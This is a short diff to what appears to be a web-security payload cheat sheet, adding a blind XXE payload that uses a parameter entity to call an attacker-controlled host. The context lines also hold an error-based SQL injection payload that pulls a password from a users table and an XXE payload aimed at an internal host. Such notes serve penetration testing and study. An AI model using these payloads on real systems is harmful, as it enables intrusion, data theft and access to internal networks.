@@ -110,3 +110,9 @@ Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
+Bypass filtering and validation:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+<stockCheck><productId>1</productId></stockCheck>
+```
